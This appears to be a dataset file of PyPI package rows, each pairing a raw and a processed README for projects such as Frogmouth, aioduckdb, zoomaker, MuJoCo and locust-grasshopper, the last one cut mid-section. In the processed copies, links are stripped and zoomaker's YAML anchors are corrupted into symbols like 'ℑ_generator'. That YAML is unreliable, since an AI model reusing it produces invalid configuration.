

## Installing

The easiest way to install Frogmouth is with [pipx](https://pypa.github.io/pipx/) (particularly if you aren't a Python developer).

```
pipx install frogmouth
```

You can also install Frogmouth with `pip`:

```
pip install frogmouth
```

Whichever method you use, you should have a `frogmouth` command on your path.

## Running

Enter `frogmouth` at the prompt to run the app, optionally followed by a path to a Markdown file:

```
frogmouth README.md
```

You can navigate with the mouse or the keyboard.
Use <kbd>tab</kbd> and <kbd>shift</kbd>+<kbd>tab</kbd> to navigate between the various controls on screen.

## Features

You can load README files direct from GitHub repositories with the `gh` command.
Use the following syntax:

```
frogmouth gh textualize/textual
```

This also works with the address bar in the app.
See the help (<kbd>F1</kbd>) in the app for details.

## Follow this project

If this app interests you, you may want to join the Textual [Discord server](https://discord.gg/Enf6Z3qhVr).
","




[![Discord](https://img.shields.io/discord/1026214085173461072)](https://discord.gg/Enf6Z3qhVr)



# Frogmouth


Frogmouth is a terminal-based Markdown viewer / browser, built with [Textual](https://github.com/Textualize/textual).

Frogmouth can view `*.md` locally or via a URL.
There is a familiar browser-like navigation stack, history, bookmarks, and table of contents.


 🎬 Demonstration 


A quick video tour of Frogmouth.




https://user-images.githubusercontent.com/554369/235305502-2699a70e-c9a6-495e-990e-67606d84bbfa.mp4

(thanks [Screen Studio](https://www.screen.studio/))




## Screenshots





















## Compatibility

Frogmouth runs on Linux, macOS, and Windows. Frogmouth requires Python **3.8** or above.


## Installing

The easiest way to install Frogmouth is with [pipx](https://pypa.github.io/pipx/) (particularly if you aren't a Python developer).

```
pipx install frogmouth
```

You can also install Frogmouth with `pip`:

```
pip install frogmouth
```

Whichever method you use, you should have a `frogmouth` command on your path.

## Running

Enter `frogmouth` at the prompt to run the app, optionally followed by a path to a Markdown file:

```
frogmouth README.md
```

You can navigate with the mouse or the keyboard.
Use tab and shift+tab to navigate between the various controls on screen.

## Features

You can load README files direct from GitHub repositories with the `gh` command.
Use the following syntax:

```
frogmouth gh textualize/textual
```

This also works with the address bar in the app.
See the help (F1) in the app for details.

## Follow this project

If this app interests you, you may want to join the Textual [Discord server](https://discord.gg/Enf6Z3qhVr).
",textualize/frogmouth
bw-graph-tools,https://github.com/brightway-lca/bw_graph_tools,11,2193,2173,"# bw_graph_tools

[![PyPI](https://img.shields.io/pypi/v/bw_graph_tools.svg)][pypi status]
[![Status](https://img.shields.io/pypi/status/bw_graph_tools.svg)][pypi status]
[![Python Version](https://img.shields.io/pypi/pyversions/bw_graph_tools)][pypi status]
[![License](https://img.shields.io/pypi/l/bw_graph_tools)][license]

[![Read the documentation at https://bw_graph_tools.readthedocs.io/](https://img.shields.io/readthedocs/bw_graph_tools/latest.svg?label=Read%20the%20Docs)][read the docs]
[![Tests](https://github.com/brightway-lca/bw_graph_tools/workflows/Tests/badge.svg)][tests]
[![Codecov](https://codecov.io/gh/brightway-lca/bw_graph_tools/branch/main/graph/badge.svg)][codecov]

[![pre-commit](https://img.shields.io/badge/pre--commit-enabled-brightgreen?logo=pre-commit&logoColor=white)][pre-commit]
[![Black](https://img.shields.io/badge/code%20style-black-000000.svg)][black]

[pypi status]: https://pypi.org/project/bw_graph_tools/
[read the docs]: https://bw_graph_tools.readthedocs.io/
[tests]: https://github.com/brightway-lca/bw_graph_tools/actions?workflow=Tests
[codecov]: https://app.codecov.io/gh/brightway-lca/bw_graph_tools
[pre-commit]: https://github.com/pre-commit/pre-commit
[black]: https://github.com/psf/black

## Installation

You can install _bw_graph_tools_ via [pip] from [PyPI]:

```console
$ pip install bw_graph_tools
```

## Contributing

Contributions are very welcome.
To learn more, see the [Contributor Guide].

## License

Distributed under the terms of the [BSD 3 Clause license][license],
_bw_graph_tools_ is free and open source software.

## Issues

If you encounter any problems,
please [file an issue] along with a detailed description.

## Documentation

1. Install the `sphinx-furo` conda environment from the file `.docs/environment.yml`.
2. Build the documentation locally by running

```
sphinx-autobuild docs _build/html -a -j auto --open-browser
```

<!-- github-only -->

[command-line reference]: https://bw_graph_tools.readthedocs.io/en/latest/usage.html
[license]: https://github.com/brightway-lca/bw_graph_tools/blob/main/LICENSE
[contributor guide]: https://github.com/brightway-lca/bw_graph_tools/blob/main/CONTRIBUTING.md
","# bw_graph_tools

[![PyPI](https://img.shields.io/pypi/v/bw_graph_tools.svg)][pypi status]
[![Status](https://img.shields.io/pypi/status/bw_graph_tools.svg)][pypi status]
[![Python Version](https://img.shields.io/pypi/pyversions/bw_graph_tools)][pypi status]
[![License](https://img.shields.io/pypi/l/bw_graph_tools)][license]

[![Read the documentation at https://bw_graph_tools.readthedocs.io/](https://img.shields.io/readthedocs/bw_graph_tools/latest.svg?label=Read%20the%20Docs)][read the docs]
[![Tests](https://github.com/brightway-lca/bw_graph_tools/workflows/Tests/badge.svg)][tests]
[![Codecov](https://codecov.io/gh/brightway-lca/bw_graph_tools/branch/main/graph/badge.svg)][codecov]

[![pre-commit](https://img.shields.io/badge/pre--commit-enabled-brightgreen?logo=pre-commit&logoColor=white)][pre-commit]
[![Black](https://img.shields.io/badge/code%20style-black-000000.svg)][black]

[pypi status]: https://pypi.org/project/bw_graph_tools/
[read the docs]: https://bw_graph_tools.readthedocs.io/
[tests]: https://github.com/brightway-lca/bw_graph_tools/actions?workflow=Tests
[codecov]: https://app.codecov.io/gh/brightway-lca/bw_graph_tools
[pre-commit]: https://github.com/pre-commit/pre-commit
[black]: https://github.com/psf/black

## Installation

You can install _bw_graph_tools_ via [pip] from [PyPI]:

```console
$ pip install bw_graph_tools
```

## Contributing

Contributions are very welcome.
To learn more, see the [Contributor Guide].

## License

Distributed under the terms of the [BSD 3 Clause license][license],
_bw_graph_tools_ is free and open source software.

## Issues

If you encounter any problems,
please [file an issue] along with a detailed description.

## Documentation

1. Install the `sphinx-furo` conda environment from the file `.docs/environment.yml`.
2. Build the documentation locally by running

```
sphinx-autobuild docs _build/html -a -j auto --open-browser
```



[command-line reference]: https://bw_graph_tools.readthedocs.io/en/latest/usage.html
[license]: https://github.com/brightway-lca/bw_graph_tools/blob/main/LICENSE
[contributor guide]: https://github.com/brightway-lca/bw_graph_tools/blob/main/CONTRIBUTING.md
",brightway-lca/bw_graph_tools
django-import-export-extensions,https://github.com/saritasa-nest/django-import-export-extensions,9,2280,2172,"===============================
django-import-export-extensions
===============================

.. image:: https://github.com/saritasa-nest/django-import-export-extensions/actions/workflows/checks.yml/badge.svg
        :target: https://github.com/saritasa-nest/django-import-export-extensions/actions/workflows/checks.yml
        :alt: Build status on Github

.. image:: https://img.shields.io/badge/python%20versions-3.9%20%7C%203.10%20%7C%203.11-blue
        :target: https://pypi.org/project/import-export-extensions/
        :alt: Supported python versions

.. image:: https://img.shields.io/badge/django--versions-3.2%20%7C%204.0%20%7C%204.1%20%7C%204.2-blue
        :target: https://pypi.org/project/import-export-extensions/
        :alt: Supported django versions

.. image:: https://readthedocs.org/projects/django-import-export-extensions/badge/?version=latest
    :target: https://django-import-export-extensions.readthedocs.io/en/latest/?badge=latest
    :alt: Documentation Status

Description
-----------
`django-import-export-extensions` extends the functionality of
`django-import-export <https://github.com/django-import-export/django-import-export/>`_
adding the following features:

* Import/export resources in the background via Celery
* Manage import/export jobs via Django Admin
* DRF integration that allows to work with import/export jobs via API
* Support `drf-spectacular <https://github.com/tfranzel/drf-spectacular>`_ generated API schema
* Additional fields and widgets (FileWidget, IntermediateM2MWidget, M2MField)

Migration from django-import-export
-----------------------------------
Resources migration
^^^^^^^^^^^^^^^^^^^
Change ``Resource`` or ``ModelResource`` to
``CeleryResource`` or ``CeleryModelResource`` respectively.

Admin migration
^^^^^^^^^^^^^^^
Change ``ImportMixin``, ``ExportMixin``, ``ImportExportMixin``
to ``CeleryImportMixin``, ``CeleryExportMixin`` or ``CeleryImportExportMixin`` respectively.

License
-------
* Free software: MIT license
* Documentation: https://django-import-export-extensions.readthedocs.io.


=======
History
=======

0.1.1 (2023-04-27)
------------------

* Add package description
* Add configuration file for read-the-docs service

0.1.0 (2023-04-01)
------------------

* First release on PyPI.
","===============================
django-import-export-extensions
===============================

.. image:: https://github.com/saritasa-nest/django-import-export-extensions/actions/workflows/checks.yml/badge.svg
        :target: https://github.com/saritasa-nest/django-import-export-extensions/actions/workflows/checks.yml
        :alt: Build status on Github

.. image:: https://img.shields.io/badge/python%20versions-3.9%20%7C%203.10%20%7C%203.11-blue
        :target: https://pypi.org/project/import-export-extensions/
        :alt: Supported python versions

.. image:: https://img.shields.io/badge/django--versions-3.2%20%7C%204.0%20%7C%204.1%20%7C%204.2-blue
        :target: https://pypi.org/project/import-export-extensions/
        :alt: Supported django versions

.. image:: https://readthedocs.org/projects/django-import-export-extensions/badge/?version=latest
    :target: https://django-import-export-extensions.readthedocs.io/en/latest/?badge=latest
    :alt: Documentation Status

Description
-----------
`django-import-export-extensions` extends the functionality of
`django-import-export `_
adding the following features:

* Import/export resources in the background via Celery
* Manage import/export jobs via Django Admin
* DRF integration that allows to work with import/export jobs via API
* Support `drf-spectacular `_ generated API schema
* Additional fields and widgets (FileWidget, IntermediateM2MWidget, M2MField)

Migration from django-import-export
-----------------------------------
Resources migration
^^^^^^^^^^^^^^^^^^^
Change ``Resource`` or ``ModelResource`` to
``CeleryResource`` or ``CeleryModelResource`` respectively.

Admin migration
^^^^^^^^^^^^^^^
Change ``ImportMixin``, ``ExportMixin``, ``ImportExportMixin``
to ``CeleryImportMixin``, ``CeleryExportMixin`` or ``CeleryImportExportMixin`` respectively.

License
-------
* Free software: MIT license
* Documentation: https://django-import-export-extensions.readthedocs.io.


=======
History
=======

0.1.1 (2023-04-27)
------------------

* Add package description
* Add configuration file for read-the-docs service

0.1.0 (2023-04-01)
------------------

* First release on PyPI.
",saritasa-nest/django-import-export-extensions
cv2-collage-v2,https://github.com/hansalemaos/cv2_collage_v2,6,1401,1401,"# Creates a collage from images with OpenCV

## pip install cv2-collage-v2 

# Tested against Windows 10 / Python 3.10 / Anaconda

## How to use it

```python
from cv2_collage_v2 import create_collage_v2
import os
import cv2
folder=r'C:\Users\hansc\Downloads\bd'
allpics =[]
for f in os.listdir(folder):
    try:
        allpics.append(cv2.imread(os.path.join(folder,f)))
    except Exception as fe:
        print(fe)
        continue

collage=create_collage_v2(allpics,maxwidth = 1500,heightdiv=16,widthdiv=5,background=(0, 0, 0),save_path='e:\\nyhctest.png',)

cv2.imshow('Collage', collage)
cv2.waitKey(0)
cv2.destroyAllWindows()



    Args:
        lst (list|tuple): A list or tuple of images - allowed: [file paths, base64, bytes, PIL, urls, np.array].
        maxwidth (int, optional): The maximum width of the collage. Defaults to 1080.
        heightdiv (int, optional): The height division factor. Defaults to 6.
        widthdiv (int, optional): The width division factor. Defaults to 2.
        background (tuple, optional): The background color of the collage. Defaults to (0, 0, 0).
        save_path (str|None, optional): The file path to save the collage. Defaults to None.

    Returns:
        np.array: A NumPy array representing the collage image.

```


![](https://github.com/hansalemaos/screenshots/blob/main/nyhctest.png?raw=true)

","# Creates a collage from images with OpenCV

## pip install cv2-collage-v2 

# Tested against Windows 10 / Python 3.10 / Anaconda

## How to use it

```python
from cv2_collage_v2 import create_collage_v2
import os
import cv2
folder=r'C:\Users\hansc\Downloads\bd'
allpics =[]
for f in os.listdir(folder):
    try:
        allpics.append(cv2.imread(os.path.join(folder,f)))
    except Exception as fe:
        print(fe)
        continue

collage=create_collage_v2(allpics,maxwidth = 1500,heightdiv=16,widthdiv=5,background=(0, 0, 0),save_path='e:\\nyhctest.png',)

cv2.imshow('Collage', collage)
cv2.waitKey(0)
cv2.destroyAllWindows()



    Args:
        lst (list|tuple): A list or tuple of images - allowed: [file paths, base64, bytes, PIL, urls, np.array].
        maxwidth (int, optional): The maximum width of the collage. Defaults to 1080.
        heightdiv (int, optional): The height division factor. Defaults to 6.
        widthdiv (int, optional): The width division factor. Defaults to 2.
        background (tuple, optional): The background color of the collage. Defaults to (0, 0, 0).
        save_path (str|None, optional): The file path to save the collage. Defaults to None.

    Returns:
        np.array: A NumPy array representing the collage image.

```


![](https://github.com/hansalemaos/screenshots/blob/main/nyhctest.png?raw=true)

",hansalemaos/cv2_collage_v2
aioduckdb,https://github.com/kouta-kun/aioduckdb,2,2093,2035,"aioduckdb\: DuckDB for AsyncIO
==============================

aioduckdb provides a friendly, async interface to DuckDB databases. It has been ported from the original aiosqlite module.

It replicates the ``duckdb`` module, but with async versions
of all the standard connection and cursor methods, plus context managers for
automatically closing connections and cursors::

    async with aioduckdb.connect(...) as db:
        await db.execute(""INSERT INTO some_table ..."")
        await db.commit()

        async with db.execute(""SELECT * FROM some_table"") as cursor:
            async for row in cursor:
                ...

It can also be used in the traditional, procedural manner::

    db = await aioduckdb.connect(...)
    cursor = await db.execute('SELECT * FROM some_table')
    row = await cursor.fetchone()
    rows = await cursor.fetchall()
    await cursor.close()
    await db.close()

Install
-------

aioduckdb is compatible with Python 3.6 and newer.
~~You can install it from PyPI:~~ Not currently on PyPI.


Details
-------

aioduckdb allows interaction with DuckDB databases on the main AsyncIO event
loop without blocking execution of other coroutines while waiting for queries
or data fetches.  It does this by using a single, shared thread per connection.
This thread executes all actions within a shared request queue to prevent
overlapping actions.

Connection objects are proxies to the real connections, contain the shared
execution thread, and provide context managers to handle automatically closing
connections.  Cursors are similarly proxies to the real cursors, and provide
async iterators to query results.


License
-------

aioduckdb is copyright Salvador Pardiñas, and licensed under the
MIT license.  I am providing code in this repository to you under an open source
license.  This is my personal repository; the license you receive to my code
is from me and not from my employer. See the `LICENSE`_ file for details.


Big thanks to `Amethyst Reese <https://noswap.com>`_ for the original `aiosqlite <https://github.com/omnilib/aiosqlite>`_ repository.
","aioduckdb\: DuckDB for AsyncIO
==============================

aioduckdb provides a friendly, async interface to DuckDB databases. It has been ported from the original aiosqlite module.

It replicates the ``duckdb`` module, but with async versions
of all the standard connection and cursor methods, plus context managers for
automatically closing connections and cursors::

    async with aioduckdb.connect(...) as db:
        await db.execute(""INSERT INTO some_table ..."")
        await db.commit()

        async with db.execute(""SELECT * FROM some_table"") as cursor:
            async for row in cursor:
                ...

It can also be used in the traditional, procedural manner::

    db = await aioduckdb.connect(...)
    cursor = await db.execute('SELECT * FROM some_table')
    row = await cursor.fetchone()
    rows = await cursor.fetchall()
    await cursor.close()
    await db.close()

Install
-------

aioduckdb is compatible with Python 3.6 and newer.
~~You can install it from PyPI:~~ Not currently on PyPI.


Details
-------

aioduckdb allows interaction with DuckDB databases on the main AsyncIO event
loop without blocking execution of other coroutines while waiting for queries
or data fetches.  It does this by using a single, shared thread per connection.
This thread executes all actions within a shared request queue to prevent
overlapping actions.

Connection objects are proxies to the real connections, contain the shared
execution thread, and provide context managers to handle automatically closing
connections.  Cursors are similarly proxies to the real cursors, and provide
async iterators to query results.


License
-------

aioduckdb is copyright Salvador Pardiñas, and licensed under the
MIT license.  I am providing code in this repository to you under an open source
license.  This is my personal repository; the license you receive to my code
is from me and not from my employer. See the `LICENSE`_ file for details.


Big thanks to `Amethyst Reese `_ for the original `aiosqlite `_ repository.
",kouta-kun/aioduckdb
zoomaker,https://github.com/hfg-gmuend/zoomaker,2,5234,5031,"Zoomaker - Friendly house keeping for your AI model zoo and related resources.
========

Zoomaker is a command-line tool that helps install AI models, git repositories and run scripts.

- **single source of truth**: all resources are neatly definied in the `zoo.yaml` file
- **freeze versions**: know exactly which revision of a resources is installed at any time
- **only download once**: optimize bandwidth and cache your models locally
- **optimize disk usage**: downloaded models are symlinked to the installation folder (small files <5MB are duplicate)

## 🛠 Installation

```bash
pip install zoomaker
```

## 🦁 zoo.yaml Examples

Example of the `zoo.yaml` of a Stable Diffsion project with the [Automatic1111](https://github.com/AUTOMATIC1111/stable-diffusion-webui) image generator:

```yaml
name: my-automatic1111-model-zoo
version: 1.0
description: Lorem ipsum
author: your name

resources:
  image_generator:
    - name: automatic1111
      src: https://github.com/AUTOMATIC1111/stable-diffusion-webui.git
      type: git
      revision: 22bcc7be428c94e9408f589966c2040187245d81
      install_to: ./

  models:
    - name: v2-1_768-ema-pruned
      src: stabilityai/stable-diffusion-2-1/v2-1_768-ema-pruned.safetensors
      type: huggingface
      install_to: ./stable-diffusion-webui/models/Stable-diffusion/
```

<details>
<summary>`zoo.yaml` example long</summary>

```yaml
name: my-automatic1111-model-zoo
version: 1.0
description: Lorem ipsum
author: your name

aliases:
  image_generator: &image_generator ./
  models: &models ./stable-diffusion-webui/models/Stable-diffusion/
  controlnet: &controlnet ./stable-diffusion-webui/models/ControlNet/
  embeddings: &embeddings ./stable-diffusion-webui/embeddings/
  extensions: &extensions ./stable-diffusion-webui/extensions/

resources:
  image_generator:
    - name: automatic1111
      src: https://github.com/AUTOMATIC1111/stable-diffusion-webui.git
      type: git
      revision: 22bcc7be428c94e9408f589966c2040187245d81
      install_to: *image_generator

  models:
    - name: v1-5-pruned-emaonly
      src: runwayml/stable-diffusion-v1-5/v1-5-pruned-emaonly.safetensors
      type: huggingface
      install_to: *models

  controlnet:
    - name: control_sd15_canny
      src: lllyasviel/ControlNet/models/control_sd15_canny.pth
      type: huggingface
      install_to: *controlnet

  embeddings:
    - name: midjourney-style
      src: sd-concepts-library/midjourney-style/learned_embeds.bin
      type: huggingface
      install_to: *embeddings
      rename_to: midjourney-style.bin
    - name: moebius
      src: sd-concepts-library/moebius/learned_embeds.bin
      type: huggingface
      install_to: *embeddings
      rename_to: moebius.bin

  extensions:
    - name: sd-webui-tunnels
      src: https://github.com/Bing-su/sd-webui-tunnels.git
      type: git
      install_to: *extensions

scripts:
  start: |
    cd /home/$(whoami)/stable-diffusion-webui/
    ./webui.sh
```
</details>

<details>
<summary>`zoo.yaml` with web download</summary>

```yaml
models:
  resources:
    - name: analog-diffusion-v1
      src: https://civitai.com/api/download/models/1344
      type: download
      install_to: ./stable-diffusion-webui/models/Stable-diffusion/
      rename_to: analog-diffusion-v1.safetensors
```
</details>

Please note:
The resource `type: download` can be seen as the last resort. Currently there is no caching or symlinking of web downloads. Recommended to avoid it.

## 🧮 zoo.yaml Structure

<details>
<summary>Top level:</summary>

- `name` (mandatory)
- `version`, `description`, `author`, `aliases` (optional)
- `resources` (mandatory) : `<group-name>` : `[]` (array of resources)
- `scripts` (optional) : `<script-name>`
</details>

<details>
<summary>Resource:</summary>

- `name`, `src`, `type`, `install_to` (mandatory)
- `rename_to` (optional)
- `revision` (optional), if none is defined the latest version from the main branch is downloaded
- `type` can either be `git`, `huggingface` or `download`
</details>

## 🧞 Zoomaker Commands

All commands are run from the root of the project, where also your `zoo.yaml` file is located.

| Command                | Action                                           |
| :--------------------- | :----------------------------------------------- |
| `zoomaker install`          | Installs resources as defined in `zoo.yaml`                           |
| `zoomaker run <script_name>`    | Run CLI scripts as defined in `zoo.yaml` |
| `zoomaker --help` | Get help using the Zoomaker CLI                     |
| `zoomaker --version` | Show current Zoomaker version                     |

## 🤗 Hugging Face Access Token

You might be asked for a [Hugging Face Access Token](https://huggingface.co/docs/hub/security-tokens) during `zoomaker install`. Some resources on Hugging Face require accepting the terms of use of the model. You can set your access token by running this command in a terminal. The command `huggingface-cli` is automatically shipped alongside zoomaker.

```bash
huggingface-cli login
```

## 🙏 Acknowledgements
- Most of the internal heavy lifting is done be the [huggingface_hub library](https://huggingface.co/docs/huggingface_hub/guides/download) by Hugging Face. Thanks!
","Zoomaker - Friendly house keeping for your AI model zoo and related resources.
========

Zoomaker is a command-line tool that helps install AI models, git repositories and run scripts.

- **single source of truth**: all resources are neatly definied in the `zoo.yaml` file
- **freeze versions**: know exactly which revision of a resources is installed at any time
- **only download once**: optimize bandwidth and cache your models locally
- **optimize disk usage**: downloaded models are symlinked to the installation folder (small files <5MB are duplicate)

## 🛠 Installation

```bash
pip install zoomaker
```

## 🦁 zoo.yaml Examples

Example of the `zoo.yaml` of a Stable Diffsion project with the [Automatic1111](https://github.com/AUTOMATIC1111/stable-diffusion-webui) image generator:

```yaml
name: my-automatic1111-model-zoo
version: 1.0
description: Lorem ipsum
author: your name

resources:
  image_generator:
    - name: automatic1111
      src: https://github.com/AUTOMATIC1111/stable-diffusion-webui.git
      type: git
      revision: 22bcc7be428c94e9408f589966c2040187245d81
      install_to: ./

  models:
    - name: v2-1_768-ema-pruned
      src: stabilityai/stable-diffusion-2-1/v2-1_768-ema-pruned.safetensors
      type: huggingface
      install_to: ./stable-diffusion-webui/models/Stable-diffusion/
```


`zoo.yaml` example long

```yaml
name: my-automatic1111-model-zoo
version: 1.0
description: Lorem ipsum
author: your name

aliases:
  image_generator: ℑ_generator ./
  models: ⊧ ./stable-diffusion-webui/models/Stable-diffusion/
  controlnet: &controlnet ./stable-diffusion-webui/models/ControlNet/
  embeddings: &embeddings ./stable-diffusion-webui/embeddings/
  extensions: &extensions ./stable-diffusion-webui/extensions/

resources:
  image_generator:
    - name: automatic1111
      src: https://github.com/AUTOMATIC1111/stable-diffusion-webui.git
      type: git
      revision: 22bcc7be428c94e9408f589966c2040187245d81
      install_to: *image_generator

  models:
    - name: v1-5-pruned-emaonly
      src: runwayml/stable-diffusion-v1-5/v1-5-pruned-emaonly.safetensors
      type: huggingface
      install_to: *models

  controlnet:
    - name: control_sd15_canny
      src: lllyasviel/ControlNet/models/control_sd15_canny.pth
      type: huggingface
      install_to: *controlnet

  embeddings:
    - name: midjourney-style
      src: sd-concepts-library/midjourney-style/learned_embeds.bin
      type: huggingface
      install_to: *embeddings
      rename_to: midjourney-style.bin
    - name: moebius
      src: sd-concepts-library/moebius/learned_embeds.bin
      type: huggingface
      install_to: *embeddings
      rename_to: moebius.bin

  extensions:
    - name: sd-webui-tunnels
      src: https://github.com/Bing-su/sd-webui-tunnels.git
      type: git
      install_to: *extensions

scripts:
  start: |
    cd /home/$(whoami)/stable-diffusion-webui/
    ./webui.sh
```


`zoo.yaml` with web download

```yaml
models:
  resources:
    - name: analog-diffusion-v1
      src: https://civitai.com/api/download/models/1344
      type: download
      install_to: ./stable-diffusion-webui/models/Stable-diffusion/
      rename_to: analog-diffusion-v1.safetensors
```


Please note:
The resource `type: download` can be seen as the last resort. Currently there is no caching or symlinking of web downloads. Recommended to avoid it.

## 🧮 zoo.yaml Structure


Top level:

- `name` (mandatory)
- `version`, `description`, `author`, `aliases` (optional)
- `resources` (mandatory) : `` : `[]` (array of resources)
- `scripts` (optional) : ``


Resource:

- `name`, `src`, `type`, `install_to` (mandatory)
- `rename_to` (optional)
- `revision` (optional), if none is defined the latest version from the main branch is downloaded
- `type` can either be `git`, `huggingface` or `download`


## 🧞 Zoomaker Commands

All commands are run from the root of the project, where also your `zoo.yaml` file is located.

| Command                | Action                                           |
| :--------------------- | :----------------------------------------------- |
| `zoomaker install`          | Installs resources as defined in `zoo.yaml`                           |
| `zoomaker run `    | Run CLI scripts as defined in `zoo.yaml` |
| `zoomaker --help` | Get help using the Zoomaker CLI                     |
| `zoomaker --version` | Show current Zoomaker version                     |

## 🤗 Hugging Face Access Token

You might be asked for a [Hugging Face Access Token](https://huggingface.co/docs/hub/security-tokens) during `zoomaker install`. Some resources on Hugging Face require accepting the terms of use of the model. You can set your access token by running this command in a terminal. The command `huggingface-cli` is automatically shipped alongside zoomaker.

```bash
huggingface-cli login
```

## 🙏 Acknowledgements
- Most of the internal heavy lifting is done be the [huggingface_hub library](https://huggingface.co/docs/huggingface_hub/guides/download) by Hugging Face. Thanks!
",hfg-gmuend/zoomaker
evoluzo,https://github.com/pypa/sampleproject,0,8,8,"evoluzo
","evoluzo
",pypa/sampleproject
with-timeout,https://github.com/snjyor/with_timeout,1,142,142,"# 安装

```
pip install with_timeout
```

# 使用示例

```python
from with_timeout import with_timeout
@with_timeout(5)
def my_func():
    pass
```

","# 安装

```
pip install with_timeout
```

# 使用示例

```python
from with_timeout import with_timeout
@with_timeout(5)
def my_func():
    pass
```

",snjyor/with_timeout
mujoco-dev,https://github.com/deepmind/mujoco,0,2987,2987,"# MuJoCo Python Bindings

[![PyPI Python Version][pypi-versions-badge]][pypi]
[![PyPI version][pypi-badge]][pypi]

[pypi-versions-badge]: https://img.shields.io/pypi/pyversions/mujoco
[pypi-badge]: https://badge.fury.io/py/mujoco.svg
[pypi]: https://pypi.org/project/mujoco/

This package is the canonical Python bindings for the
[MuJoCo physics engine](https://github.com/deepmind/mujoco).
These bindings are developed and maintained by DeepMind, and is kept up-to-date
with the latest developments in MuJoCo itself.

The `mujoco` package provides direct access to raw MuJoCo C API functions,
structs, constants, and enumerations. Structs are provided as Python classes,
with Pythonic initialization and deletion semantics.

It is not the aim of this package to provide fully fledged
scene/environment/game authoring API, as there are already a number of existing
packages that do this well. However, this package does provide a number of
lower-level components outside of MuJoCo itself that are likely to be useful to
most users who access MuJoCo through Python. For example, the `egl`, `glfw`, and
`osmesa` subpackages contain utilities for setting up OpenGL rendering contexts.

## Installation

The recommended way to install this package is via [PyPI](https://pypi.org/project/mujoco/):

```sh
pip install mujoco
```

A copy of the MuJoCo library is provided as part of the package and does **not**
need to be downloaded or installed separately.

### Source

**IMPORTANT:** Building from source is only necessary if you are modifying the
Python bindings (or are trying to run on exceptionally old Linux systems).
If that's not the case, then we recommend installing the prebuilt binaries from
PyPI.

If you need to build the Python bindings from source, please consult
[the documentation](https://mujoco.readthedocs.io/en/latest/python.html#building-from-source).

## Usage

Once installed, the package can be imported via `import mujoco`. Please consult
our [documentation](https://mujoco.readthedocs.io/en/stable/python.html) for
further detail on the package's API.

We recommend going through the tutorial notebook which covers the basics of
MuJoCo using Python:
[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/deepmind/mujoco/blob/main/python/tutorial.ipynb)

## Versioning

The `major.minor.micro` portion of the version number matches the version of
MuJoCo that the bindings provide. Optionally, if we release updates to the
Python bindings themselves that target the same version of MuJoCo, a `.postN`
suffix is added, for example `2.1.2.post2` represents the second update to the
bindings for MuJoCo 2.1.2.

## License and Disclaimer

Copyright 2022 DeepMind Technologies Limited

MuJoCo and its Python bindings are licensed under the Apache License,
Version 2.0. You may obtain a copy of the License at
https://www.apache.org/licenses/LICENSE-2.0.

This is not an officially supported Google product.
","# MuJoCo Python Bindings

[![PyPI Python Version][pypi-versions-badge]][pypi]
[![PyPI version][pypi-badge]][pypi]

[pypi-versions-badge]: https://img.shields.io/pypi/pyversions/mujoco
[pypi-badge]: https://badge.fury.io/py/mujoco.svg
[pypi]: https://pypi.org/project/mujoco/

This package is the canonical Python bindings for the
[MuJoCo physics engine](https://github.com/deepmind/mujoco).
These bindings are developed and maintained by DeepMind, and is kept up-to-date
with the latest developments in MuJoCo itself.

The `mujoco` package provides direct access to raw MuJoCo C API functions,
structs, constants, and enumerations. Structs are provided as Python classes,
with Pythonic initialization and deletion semantics.

It is not the aim of this package to provide fully fledged
scene/environment/game authoring API, as there are already a number of existing
packages that do this well. However, this package does provide a number of
lower-level components outside of MuJoCo itself that are likely to be useful to
most users who access MuJoCo through Python. For example, the `egl`, `glfw`, and
`osmesa` subpackages contain utilities for setting up OpenGL rendering contexts.

## Installation

The recommended way to install this package is via [PyPI](https://pypi.org/project/mujoco/):

```sh
pip install mujoco
```

A copy of the MuJoCo library is provided as part of the package and does **not**
need to be downloaded or installed separately.

### Source

**IMPORTANT:** Building from source is only necessary if you are modifying the
Python bindings (or are trying to run on exceptionally old Linux systems).
If that's not the case, then we recommend installing the prebuilt binaries from
PyPI.

If you need to build the Python bindings from source, please consult
[the documentation](https://mujoco.readthedocs.io/en/latest/python.html#building-from-source).

## Usage

Once installed, the package can be imported via `import mujoco`. Please consult
our [documentation](https://mujoco.readthedocs.io/en/stable/python.html) for
further detail on the package's API.

We recommend going through the tutorial notebook which covers the basics of
MuJoCo using Python:
[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/deepmind/mujoco/blob/main/python/tutorial.ipynb)

## Versioning

The `major.minor.micro` portion of the version number matches the version of
MuJoCo that the bindings provide. Optionally, if we release updates to the
Python bindings themselves that target the same version of MuJoCo, a `.postN`
suffix is added, for example `2.1.2.post2` represents the second update to the
bindings for MuJoCo 2.1.2.

## License and Disclaimer

Copyright 2022 DeepMind Technologies Limited

MuJoCo and its Python bindings are licensed under the Apache License,
Version 2.0. You may obtain a copy of the License at
https://www.apache.org/licenses/LICENSE-2.0.

This is not an officially supported Google product.
",deepmind/mujoco
locust-grasshopper,https://github.com/alteryx/locust-grasshopper,8,20360,19841,"<div id=""top""></div>

# Grasshopper

A lightweight framework for performing load tests against an environment, primarily 
against an API. Grasshopper glues [Locust](https://locust.io/), [Pytest](https://docs.pytest.org/en/7.1.x/#), some plugins (namely [Locust InfluxDBListener](https://github.com/hoodoo-digital/locust-influxdb-listener) ) and some custom code to provide a
package that makes authoring load tests simple with very little boilerplate needed.

Here are some key functionalities that this project extends on Locust:
- [checks](#checks)
- [custom trends](#custom-trends)
- [timing thresholds](#thresholds)
- [streamlined metric reporting/tagging system](#db-reporting)
  (only influxDB is supported right now)

## Installation
This package can be installed via pip: `pip install locust-grasshopper`



## Configuring Grasshopper
<a id=""creating""></a>

Grasshopper adds a variety of parameters relating to performance testing along with a
variety of ways to set these values.

Recent changes (>= 1.1.1) include an expanded set of sources, almost full access to all 
arguments via every source (some exceptions outlined below), and the addition of some 
new values that will be used with integrations such as report portal & slack 
(integrations are NYI). These changes are made in a backwards compatible manner, 
meaning all existing grasshopper tests should still run without modification. The 
original fixtures and sources for configuration are deprecated, but still produce the 
same behavior.

All of the usual [pytest arguments](https://docs.pytest.org/en/6.2.x/usage.html) also remain available.

The rest of the sections on configuration assume you are using `locust-grasshopper>=1.1.1`.

### Sources
Currently, there are 5 different sources for configuration values and they are, in 
precedence order 

+ command line arguments
+ environment variables
+ scenario values from a scenario yaml file
+ grasshopper configuration file
+ global defaults (currently stored in code, not configurable by consumers)

Obviously, the global defaults defined by Grasshopper are not really a source for
